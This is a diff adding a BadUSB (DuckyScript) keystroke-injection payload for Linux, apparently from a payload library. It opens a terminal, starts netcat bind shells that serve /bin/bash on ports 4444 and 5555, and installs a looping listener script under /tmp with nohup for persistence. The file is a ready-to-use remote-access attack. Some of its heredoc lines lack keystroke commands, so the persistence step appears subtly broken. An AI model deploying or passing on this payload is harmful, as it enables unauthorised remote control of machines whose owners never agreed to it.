@@ -1,0 +1,43 @@
+REM Title: Linux Netcat Listener
+REM Author: BadUSB Library
+REM Description: Creates netcat listener for remote access
+REM Target: Linux
+REM Category: Command & Control
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Create netcat listener
+STRING nc -l -p 4444 -e /bin/bash &
+ENTER
+DELAY 2000
+
+REM Alternative on different port
+STRING nc -l -p 5555 -e /bin/bash &
+ENTER
+DELAY 2000
+
+REM Create persistent listener
+STRING cat > /tmp/nc_listener.sh << 'EOF'
+#!/bin/bash
+while true; do
+    nc -l -p 4444 -e /bin/bash
+    sleep 5
+done
+EOF
+ENTER
+DELAY 2000
+
+STRING chmod +x /tmp/nc_listener.sh
+ENTER
+DELAY 1000
+
+STRING nohup /tmp/nc_listener.sh > /dev/null 2>&1 &
+ENTER
+DELAY 2000
